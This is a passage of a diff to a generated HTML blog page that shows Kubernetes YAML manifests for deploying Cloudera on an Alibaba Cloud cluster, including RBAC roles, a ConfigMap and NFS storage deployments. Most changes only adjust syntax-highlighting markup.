+          &lt;span class=&quot;na&quot;&gt;serviceName&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile&lt;/span&gt;
+          &lt;span class=&quot;na&quot;&gt;servicePort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;相关地址&quot;&gt;相关地址&lt;/h3&gt;
 
@@ -515,59 +497,59 @@ hdfs==2.1.0
 
 &lt;h2 id=&quot;开始部署&quot;&gt;开始部署&lt;/h2&gt;
 
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ServiceAccount&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-sa&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sa&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;automountServiceAccountToken&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ServiceAccount&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-sa&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;sa&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;automountServiceAccountToken&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
 &lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRole&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-cr&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cr&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;apiGroups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;resources&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;verbs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nonResourceURLs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;verbs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRole&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-cr&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cr&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;apiGroups&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;resources&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;verbs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;nonResourceURLs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;verbs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRoleBinding&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-crb&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;crb&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ServiceAccount&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-sa&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;roleRef&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRole&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-cr&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRoleBinding&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-crb&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;crb&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ServiceAccount&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-sa&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;roleRef&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRole&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-cr&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
 &lt;span class=&quot;nn&quot;&gt;---&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ConfigMap&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-config&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-config&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;master_host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-svc&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ConfigMap&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-config&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera-config&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;master_host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;master-svc&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;cron.tab&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
     &lt;span class=&quot;no&quot;&gt;*/30 * * * * ntpdate master-svc &amp;amp;&amp;amp; hwclock --systohc&lt;/span&gt;
 
@@ -795,391 +777,390 @@ hdfs==2.1.0
     &lt;span class=&quot;no&quot;&gt;#cloudera_oracle_connector_jar=/usr/share/java/oracle-connector-java.jar&lt;/span&gt;
     &lt;span class=&quot;no&quot;&gt;#By default, postgres jar is found dynamically in $MGMT_HOME/lib&lt;/span&gt;
     &lt;span class=&quot;no&quot;&gt;#cloudera_postgresql_jdbc_jar=&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: apps/v1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Deployment&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;name: nfs-deploy&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;name: nfs&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;replicas: 1&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;revisionHistoryLimit: 2&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;matchLabels:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;name: nfs&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;template:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;metadata:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;name: nfs-client&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;name: nfs&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;spec:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;tolerations:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- key: node-role.kubernetes.io/master&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;effect: NoSchedule&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;serviceAccountName: cloudera-sa&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;containers:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- image: registry.cn-hangzhou.aliyuncs.com/acs/alicloud-nas-controller:v1.8.4&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;        imagePullPolicy: Never&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;name: nfs-client&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;        securityContext:&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;          privileged: true&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;volumeMounts:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: nfs-client-root&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;mountPath: /persistentvolumes&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;env:&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: PROVISIONER_NAME&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;value: alicloud/nas&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: NFS_SERVER&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;value: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;- name: NFS_PATH&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;value: /pv/cloudera/agent/&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;volumes:&lt;/span&gt;
-      &lt;span class=&quot;no&quot;&gt;- name: nfs-client-root&lt;/span&gt;
-        &lt;span class=&quot;no&quot;&gt;nfs:&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;server: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
-          &lt;span class=&quot;no&quot;&gt;path: /pv/cloudera/agent/&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: storage.k8s.io/v1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: StorageClass&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;name: cloudera-storage&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;name: storage&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;eclaimPolicy: Delete&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;rovisioner: alicloud/nas&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: apps/v1&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Deployment&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;name: master-deploy&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;name: master-deploy&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
-  &lt;span class=&quot;no&quot;&gt;replicas: 1&lt;/span&gt;
